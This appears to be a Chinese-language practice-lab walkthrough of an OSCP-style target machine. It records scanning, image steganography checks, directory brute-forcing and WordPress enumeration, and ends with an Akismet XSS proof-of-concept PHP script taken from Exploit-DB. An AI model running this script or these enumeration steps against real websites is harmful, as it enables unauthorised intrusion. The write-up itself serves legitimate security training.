困难难度但是是oscp的阿吉  嘿嘿加油 
![[Pasted image 20240723170117.png]]
目标靶机如下：
![[Pasted image 20240723170234.png]]
![[Pasted image 20240723170757.png]]
详细信息扫描如下：
![[Pasted image 20240723173026.png]]
提取信息 可能包含一个  CVE 名字叫做 CVE -2017-1001000   
待进一步挖掘 ：







此时80端口如下 ：进入后网页如下：
![[Pasted image 20240723170336.png]]
下载图片到本地 做后续处理 ：
下图为尝试隐写的步骤：
1
采用 exiftool 来尝试获取详细信息 查看是否有隐写数据 
![[Pasted image 20240723173603.png]]
2尝试用foremost -i 提取 信息并且输出到指定目录中区  
![[Pasted image 20240723173900.png]]
3 尝试zsteg独一无二的工具  -a 包含全部信息 ：
![[Pasted image 20240723174642.png]]未发现啥有利用价值的信息 遂 集中在binwalk上 


binwalk -e 解压处理 
![[Pasted image 20240723171059.png]]

进一步分析AC5 如下所示 ：
![[Pasted image 20240723172523.png]]
AC5文件内包含的日志文件待深度挖掘 ，



下一步静待探索 回到网页端 ：
进行目录爆破尝试搜集相关路径？
1gobuster后 
![[Pasted image 20240723175101.png]]
挨个验证  首先是/dev
提示告诉你对网络进行深入挖掘  ，
![[Pasted image 20240723175112.png]]
现在两条路 1  深入扫描挖掘信息 2 继续研究 AC2这个隐藏的日志图片  是否包含信息 

现在尝试第二条 ：
搜索引擎搜索到 可以提取相关lzma信息如下：
在此网页中：https://www.lifewire.com/lzma-file-2621951
![[Pasted image 20240723181038.png]]
现在问题是 如何将 lzma文件从 一堆yaffs里面提取出来
停留在了如何进行取证以及分析上面  



步骤一 ：再次搜寻相关线索 成都
![[Pasted image 20240723202137.png]]
成功搜集相关线索  
摘录有用信息可知：
1 利用 /wordpress/wp-links-opml.php 观察到 版本号如下：

![[Pasted image 20240723202656.png]]2 ![[Pasted image 20240723202952.png]]
这个条信息提示 ：
![[Pasted image 20240723203034.png]]
可以通过点击这里 上传的脚本触发 反弹shell 的目录 现在的问题是如何将自己的反弹shell传上去  
sql注入貌似不可以 

![[Pasted image 20240723204643.png]]
搜索 wordpress akismet 相关信息 搜索到 ：
![[Pasted image 20240723210248.png]]
然后尝试 输入路径为 ：
![[Pasted image 20240723210326.png]]
```
http://192.168.166.116/wordpress/wp- content/plugins/akismet/akismet.php
```
这个路径的信息 可以 发现是存在这个php文件的  随机搜索是否可以利用相关信息做事情呢？上网找相关脚本呢利用 
https://www.exploit-db.com/exploits/37902
尝试使用poc
修改 后 使用 ：修改路径 即可然后最终poc如下 ：
![[Pasted image 20240723212757.png]]

```
#!/usr/bin/php
<?php
#
# Akismet XSS Exploit
#

$target = $argv[1];

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_URL, "http://$target/wordpress/wp-content/plugins/akismet/akismet.php");
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "s=%3Cscript%3Ealert('XSS')%3C/script%3E");
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3);
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_$target");
$buf = curl_exec($ch);
curl_close($ch);
unset($ch);

echo $buf;
?>
```
使用后弹窗如下：
查询可知 我们被拦截了 
![[Pasted image 20240723212904.png]]
